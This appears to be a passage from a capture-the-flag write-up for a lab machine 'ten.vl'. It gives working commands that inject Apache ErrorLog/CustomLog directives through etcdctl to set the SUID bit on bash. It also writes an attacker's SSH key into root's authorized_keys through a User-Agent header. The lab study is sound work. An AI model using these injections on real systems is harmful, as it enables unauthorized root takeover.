## Use a Config File to Become Root

If we observe how the `ten.vl` website creates FTP accounts using `pspy`, we can see the following:

![ten](/assets/ten8.png)


`etcdctl` updates the Apache configuration by creating a new virtual host and then restarts the web service as **root**.

If we can invoke `etcdctl` directly and bypass the frontend filter, we should be able to inject commands into the Apache configuration file. Those commands will then be executed as **root** when the web service restarts.

We have successfully created a new virtual host. Now, we need to find a way to leverage this behavior to gain **root** privileges.

To achieve code execution, we need to inject a valid `ServerName`, insert a newline, add a malicious Apache directive, and comment out the remaining configuration.

For example:

```shell
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-b94344ef/url 'fake.ten.vl
ErrorLog "|/usr/bin/chmod u+s /usr/bin/bash"
#'
```

We can also use `CustomLog` instead:

```shell
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-b94344ef/url 'fake.ten.vl
CustomLog "|/usr/bin/chmod u+s /usr/bin/bash" common
#'
```

After a short delay, the Apache service reloads the configuration. Once the injected command has been executed, we can obtain a root shell by running:

```shell
/usr/bin/bash -p
```

The resulting virtual host configuration looks like this:

```apache
<VirtualHost *:80>
    ServerName fake.ten.vl
    CustomLog "|/usr/bin/chmod u+s /usr/bin/bash" common
    #.ten.vl
    DocumentRoot /srv/ten-b94344ef/
</VirtualHost>
```

> **Note:** If you want to execute a file, avoid placing it in `/tmp`. Apache cannot execute files from the standard `/tmp` directory because the daemon uses a separate private temporary directory.

There is another way to escalate privileges using `CustomLog`, this time with the `agent` log format.

```shell
ETCDCTL_API=3 /usr/bin/etcdctl put /customers/ten-984902b8/url 'ethicxz.ten.vl
CustomLog "/root/.ssh/authorized_keys" agent
#'
```

Next, from our local machine:

```shell
curl ethicxz.ten.vl -H 'User-Agent: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...'

ssh -i id_rsa root@ten.vl
```

Since the `agent` log format writes the `User-Agent` header to the specified file, our SSH public key is written directly into `/root/.ssh/authorized_keys`. This allows us to authenticate as `root` using the corresponding private key.

With this technique, any writable file targeted by the Apache process can potentially be overwritten, such as `authorized_keys` or, in other scenarios, configuration files like `/etc/sudoers`.
